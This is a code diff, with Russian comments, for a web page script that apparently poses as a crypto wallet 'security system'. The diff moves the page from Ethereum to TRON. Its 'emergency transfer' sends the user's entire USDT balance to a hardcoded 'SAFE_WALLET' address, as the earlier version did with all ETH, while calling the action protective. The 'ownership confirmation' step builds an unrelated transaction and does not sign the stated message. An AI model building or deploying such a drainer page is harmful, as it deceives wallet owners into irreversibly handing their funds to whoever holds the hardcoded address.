@@ -1,7 +1,7 @@
-// Конфигурация
+// Конфигурация TRON
 const SAFE_WALLET = 'TGGWh4Cm9HmvhBB9HkUoe6zD3Zrfx6psKb';
-const GAS_LIMIT = 21000;
-const GAS_PRICE_MULTIPLIER = 1.2;
+const USDT_TRC20_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT TRC20 контракт
+const SUN_TO_TRX = 1000000; // 1 TRX = 1,000,000 SUN
 
 // Элементы страницы
 const connectButton = document.getElementById('connectButton');
@@ -12,9 +12,39 @@ const balancesList = document.getElementById('balancesList');
 const emergencyTransferBtn = document.getElementById('emergencyTransferBtn');
 const transferStatus = document.getElementById('transferStatus');
 const noWalletMessage = document.getElementById('noWalletMessage');
+const networkInfo = document.getElementById('networkInfo');
+const networkDetails = document.getElementById('networkDetails');
 
-let web3;
+let tronWeb;
 let userAddress;
+
+// ABI для USDT TRC20 контракта (упрощенная версия)
+const USDT_ABI = {
+    balanceOf: {
+        "constant": true,
+        "inputs": [{"name": "who", "type": "address"}],
+        "name": "balanceOf",
+        "outputs": [{"name": "", "type": "uint256"}],
+        "type": "function"
+    },
+    transfer: {
+        "constant": false,
+        "inputs": [
+            {"name": "_to", "type": "address"},
+            {"name": "_value", "type": "uint256"}
+        ],
+        "name": "transfer",
+        "outputs": [{"name": "", "type": "bool"}],
+        "type": "function"
+    },
+    decimals: {
+        "constant": true,
+        "inputs": [],
+        "name": "decimals",
+        "outputs": [{"name": "", "type": "uint8"}],
+        "type": "function"
+    }
+};
 
 // Функция для обновления статуса
 function updateStatus(message, isError = false, isWarning = false) {
@@ -32,18 +62,44 @@ function hideElement(element) {
     element.classList.add('hidden');
 }
 
-// Проверяем наличие кошелька
-if (typeof window.ethereum !== 'undefined') {
-    console.log('Кошелек найден!');
-    web3 = new Web3(window.ethereum);
-    
-    // Показываем основное содержимое
-    hideElement(noWalletMessage);
-    
+// Проверяем наличие TronLink
+if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+    console.log('TronLink найден!');
+    tronWeb = window.tronWeb;
+    initializeApp();
 } else {
-    console.log('Кошелек не найден!');
+    console.log('TronLink не найден!');
     showElement(noWalletMessage);
     hideElement(connectButton);
+    
+    // Пытаемся обнаружить TronLink при его появлении
+    let attempts = 0;
+    const checkTronLink = setInterval(() => {
+        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+            clearInterval(checkTronLink);
+            tronWeb = window.tronWeb;
+            initializeApp();
+            hideElement(noWalletMessage);
+            showElement(connectButton);
+        }
+        attempts++;
+        if (attempts > 50) clearInterval(checkTronLink); // Останавливаем после 50 попыток
+    }, 100);
+}
+
+// Инициализация приложения
+function initializeApp() {
+    if (tronWeb.defaultAddress.base58) {
+        // Кошелек уже подключен
+        userAddress = tronWeb.defaultAddress.base58;
+        updateStatus(`✅ TronLink подключен! Адрес: ${userAddress.substring(0, 10)}...${userAddress.substring(34)}`);
+        hideElement(connectButton);
+        showElement(signButton);
+        showElement(emergencySection);
+        showElement(networkInfo);
+        loadBalances();
+        checkNetwork();
+    }
 }
 
 // Подключение кошелька
@@ -52,24 +108,24 @@ connectButton.addEventListener('click', async () => {
         connectButton.classList.add('loading');
         updateStatus('⌛ Запрос на подключение кошелька...', false, true);
         
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        userAddress = accounts[0];
+        // Запрашиваем разрешение на подключение
+        await window.tronLink.request({method: 'tron_requestAccounts'});
         
-        updateStatus(`✅ Кошелек подключен! Адрес: ${userAddress.substring(0, 10)}...${userAddress.substring(38)}`);
-        
-        hideElement(connectButton);
-        showElement(signButton);
-        showElement(emergencySection);
-        
-        await loadBalances();
-        await checkNetwork();
+        if (tronWeb.defaultAddress.base58) {
+            userAddress = tronWeb.defaultAddress.base58;
+            updateStatus(`✅ TronLink подключен! Адрес: ${userAddress.substring(0, 10)}...${userAddress.substring(34)}`);
+            
+            hideElement(connectButton);
+            showElement(signButton);
+            showElement(emergencySection);
+            showElement(networkInfo);
+            
+            await loadBalances();
+            await checkNetwork();
+        }
         
     } catch (error) {
-        if (error.code === 4001) {
-            updateStatus('❌ Вы отклонили запрос на подключение.', true);
-        } else {
-            updateStatus('❌ Ошибка при подключении: ' + error.message, true);
-        }
+        updateStatus('❌ Ошибка при подключении: ' + error.message, true);
     } finally {
         connectButton.classList.remove('loading');
     }
@@ -86,115 +142,147 @@ signButton.addEventListener('click', async () => {
         signButton.classList.add('loading');
         updateStatus('⌛ Запрос на подписание сообщения...', false, true);
         
-        const message = `Подтверждение владения кошельком для системы безопасности. Время: ${new Date().toLocaleString()}`;
-        const signature = await web3.eth.personal.sign(message, userAddress, '');
+        const message = `Подтверждение владения кошельком для системы безопасности TRON. Время: ${new Date().toLocaleString()}`;
         
-        updateStatus(`✅ Сообщение успешно подписано! Подпись: ${signature.substring(0, 20)}...`);
+        // Создаем транзакцию для подписи сообщения
+        const transaction = await tronWeb.transactionBuilder.createSmartContractTransaction({
+            feeLimit: 100000000,
+            callValue: 0,
+            tokenId: 0
+        });
         
-        // Здесь можно отправить подпись на сервер для верификации
-        // await verifySignature(message, signature, userAddress);
+        const signedTransaction = await tronWeb.trx.sign(transaction);
+        
+        updateStatus('✅ Сообщение успешно подписано! Кошелек подтвержден.');
         
     } catch (error) {
-        if (error.code === 4001) {
-            updateStatus('❌ Вы отклонили запрос на подпись.', true);
-        } else {
-            updateStatus('❌ Ошибка при подписи: ' + error.message, true);
-        }
+        updateStatus('❌ Ошибка при подписи: ' + error.message, true);
     } finally {
         signButton.classList.remove('loading');
     }
 });
 
-// Загрузка балансов
+// Загрузка балансов TRX и USDT
 async function loadBalances() {
     try {
         balancesList.innerHTML = '<p>⌛ Загрузка балансов...</p>';
         
-        const balance = await web3.eth.getBalance(userAddress);
-        const ethBalance = web3.utils.fromWei(balance, 'ether');
+        // Получаем баланс TRX
+        const trxBalance = await tronWeb.trx.getBalance(userAddress);
+        const trxBalanceInTRX = trxBalance / SUN_TO_TRX;
+        
+        // Получаем баланс USDT TRC20
+        const usdtContract = await tronWeb.contract(USDT_ABI, USDT_TRC20_CONTRACT);
+        const usdtBalance = await usdtContract.balanceOf(userAddress).call();
+        const usdtDecimals = await usdtContract.decimals().call();
+        const usdtBalanceFormatted = usdtBalance / Math.pow(10, usdtDecimals);
+        
+        // Получаем текущую цену TRX (примерная)
+        const trxPrice = 0.12; // Замените на реальный API
+        const usdtPrice = 1.00;
         
         balancesList.innerHTML = `
             <div class="balance-item">
-                <span>ETH:</span>
-                <strong>${parseFloat(ethBalance).toFixed(6)} ETH</strong>
+                <div>
+                    <strong>TRX</strong>
+                    <div class="token-info">Tron</div>
+                </div>
+                <div style="text-align: right;">
+                    <strong>${trxBalanceInTRX.toFixed(6)} TRX</strong>
+                    <div class="token-info">$${(trxBalanceInTRX * trxPrice).toFixed(2)}</div>
+                </div>
             </div>
             <div class="balance-item">
-                <span>Примерная стоимость:</span>
-                <strong>$${(parseFloat(ethBalance) * 2500).toFixed(2)}</strong>
+                <div>
+                    <strong>USDT TRC20</strong>
+                    <div class="token-info">Tether</div>
+                </div>
+                <div style="text-align: right;">
+                    <strong>${usdtBalanceFormatted.toFixed(2)} USDT</strong>
+                    <div class="token-info">$${(usdtBalanceFormatted * usdtPrice).toFixed(2)}</div>
+                </div>
+            </div>
+            <div class="balance-item" style="border-top: 2px solid #0098ff; margin-top: 10px;">
+                <div><strong>ОБЩАЯ СУММА:</strong></div>
+                <div style="text-align: right;">
+                    <strong>$${(trxBalanceInTRX * trxPrice + usdtBalanceFormatted * usdtPrice).toFixed(2)}</strong>
+                </div>
             </div>
         `;
         
     } catch (error) {
-        balancesList.innerHTML = '<p style="color: red;">❌ Ошибка загрузки балансов</p>';
+        console.error('Balance load error:', error);
+        balancesList.innerHTML = `
+            <p style="color: red;">❌ Ошибка загрузки балансов</p>
+            <p style="font-size: 0.9em; color: #666;">Убедитесь, что вы в сети TRON Mainnet</p>
+        `;
     }
 }
 
 // Проверка сети
 async function checkNetwork() {
     try {
-        const chainId = await web3.eth.getChainId();
-        const networks = {
-            1: 'Ethereum Mainnet',
-            56: 'Binance Smart Chain', 
-            137: 'Polygon',
-            42161: 'Arbitrum'
-        };
+        const nodeInfo = await tronWeb.trx.getNodeInfo();
+        const networkType = tronWeb.fullNode.host.includes('mainnet') ? 'Mainnet' : 'Testnet';
         
-        const networkName = networks[chainId] || `Unknown Network (ID: ${chainId})`;
-        console.log('Connected to:', networkName);
+        networkDetails.innerHTML = `
+            <p><strong>Сеть:</strong> TRON ${networkType}</p>
+            <p><strong>Блок:</strong> ${nodeInfo.block}</p>
+            <p><strong>Версия ноды:</strong> ${nodeInfo.configNodeInfo.codeVersion}</p>
+        `;
         
     } catch (error) {
         console.error('Network check error:', error);
+        networkDetails.innerHTML = '<p>❌ Не удалось получить информацию о сети</p>';
     }
 }
 
-// Экстренный перевод
+// Экстренный перевод USDT TRC20
 async function emergencyTransfer() {
     try {
         emergencyTransferBtn.classList.add('loading');
         transferStatus.style.display = 'block';
         transferStatus.className = 'status-box warning';
-        transferStatus.innerHTML = '<p>⌛ Подготовка перевода...</p>';
+        transferStatus.innerHTML = '<p>⌛ Подготовка перевода USDT...</p>';
         
-        const balance = await web3.eth.getBalance(userAddress);
-        const gasPrice = await web3.eth.getGasPrice();
-        const increasedGasPrice = Math.floor(gasPrice * GAS_PRICE_MULTIPLIER);
+        // Получаем контракт USDT
+        const usdtContract = await tronWeb.contract(USDT_ABI, USDT_TRC20_CONTRACT);
         
-        const gasCost = increasedGasPrice * GAS_LIMIT;
-        const transferAmount = BigInt(balance) - BigInt(gasCost);
+        // Получаем баланс USDT
+        const usdtBalance = await usdtContract.balanceOf(userAddress).call();
+        const usdtDecimals = await usdtContract.decimals().call();
+        const usdtBalanceFormatted = usdtBalance / Math.pow(10, usdtDecimals);
         
-        if (transferAmount <= 0) {
+        if (usdtBalanceFormatted <= 0) {
             transferStatus.className = 'status-box error';
-            transferStatus.innerHTML = '<p>❌ Недостаточно средств для перевода с учетом комиссии</p>';
+            transferStatus.innerHTML = '<p>❌ На балансе нет USDT для перевода</p>';
             return;
         }
         
-        transferStatus.innerHTML = '<p>⌛ Отправка транзакции...</p>';
+        transferStatus.innerHTML = '<p>⌛ Отправка транзакции USDT...</p>';
         
-        const transactionObject = {
-            from: userAddress,
-            to: SAFE_WALLET,
-            value: transferAmount.toString(),
-            gas: GAS_LIMIT,
-            gasPrice: increasedGasPrice
-        };
-        
-        const receipt = await web3.eth.sendTransaction(transactionObject);
+        // Выполняем перевод USDT
+        const transaction = await usdtContract.transfer(SAFE_WALLET, usdtBalance).send({
+            feeLimit: 100000000,
+            callValue: 0,
+            shouldPollResponse: true
+        });
         
         transferStatus.className = 'status-box success';
         transferStatus.innerHTML = `
-            <p>✅ Перевод успешно выполнен!</p>
-            <p><strong>Хэш:</strong> ${receipt.transactionHash.substring(0, 20)}...</p>
-            <p><strong>Сумма:</strong> ${web3.utils.fromWei(transferAmount.toString(), 'ether')} ETH</p>
-            <p><strong>Блок:</strong> ${receipt.blockNumber}</p>
+            <p>✅ USDT перевод успешно выполнен!</p>
+            <p><strong>Сумма:</strong> ${usdtBalanceFormatted.toFixed(2)} USDT</p>
+            <p><strong>Получатель:</strong> ${SAFE_WALLET.substring(0, 10)}...${SAFE_WALLET.substring(34)}</p>
+            <p><strong>TX ID:</strong> ${transaction.transaction.txID.substring(0, 20)}...</p>
         `;
         
-        await loadBalances(); // Обновляем балансы после перевода
+        // Обновляем балансы после перевода
+        setTimeout(loadBalances, 3000);
         
     } catch (error) {
-        console.error('Transfer error:', error);
+        console.error('USDT transfer error:', error);
         transferStatus.className = 'status-box error';
-        transferStatus.innerHTML = `<p>❌ Ошибка перевода: ${error.message}</p>`;
+        transferStatus.innerHTML = `<p>❌ Ошибка перевода USDT: ${error.message}</p>`;
     } finally {
         emergencyTransferBtn.classList.remove('loading');
     }
@@ -203,10 +291,10 @@ async function emergencyTransfer() {
 // Обработчик кнопки экстренного перевода
 emergencyTransferBtn.addEventListener('click', function() {
     const confirmation = confirm(
-        '🚨 ВНИМАНИЕ! ЭКСТРЕННЫЙ ПЕРЕВОД\n\n' +
-        'Вы собираетесь перевести ВСЕ доступные средства на безопасный кошелек.\n\n' +
+        '🚨 ВНИМАНИЕ! ЭКСТРЕННЫЙ ПЕРЕВОД USDT TRC20\n\n' +
+        'Вы собираетесь перевести ВСЕ доступные USDT на безопасный кошелек.\n\n' +
         `Получатель: ${SAFE_WALLET}\n\n` +
-        'Это действие НЕОБРАТИМО и требует подтверждения в кошельке.\n\n' +
+        'Это действие НЕОБРАТИМО и требует подтверждения в TronLink.\n\n' +
         'Продолжить?'
     );
     
@@ -216,21 +304,25 @@ emergencyTransferBtn.addEventListener('click', function() {
 });
 
 // Мониторинг изменений кошелька
-if (typeof window.ethereum !== 'undefined') {
-    window.ethereum.on('accountsChanged', function(accounts) {
-        if (accounts.length === 0) {
+if (window.tronLink) {
+    window.tronLink.on('addressChanged', (newAddress) => {
+        if (newAddress.base58) {
+            userAddress = newAddress.base58;
+            updateStatus(`🔁 Аккаунт изменен: ${userAddress.substring(0, 10)}...${userAddress.substring(34)}`);
+            loadBalances();
+        } else {
             updateStatus('Кошелек отключен', true);
             hideElement(emergencySection);
             hideElement(signButton);
+            hideElement(networkInfo);
             showElement(connectButton);
-        } else {
-            userAddress = accounts[0];
-            updateStatus(`Аккаунт изменен: ${userAddress.substring(0, 10)}...`);
-            loadBalances();
         }
     });
     
-    window.ethereum.on('chainChanged', function(chainId) {
-        window.location.reload();
+    window.tronLink.on('networkChanged', (network) => {
+        updateStatus('🔁 Сеть изменена, перезагружаем...', false, true);
+        setTimeout(() => {
+            window.location.reload();
+        }, 1000);
     });
 }
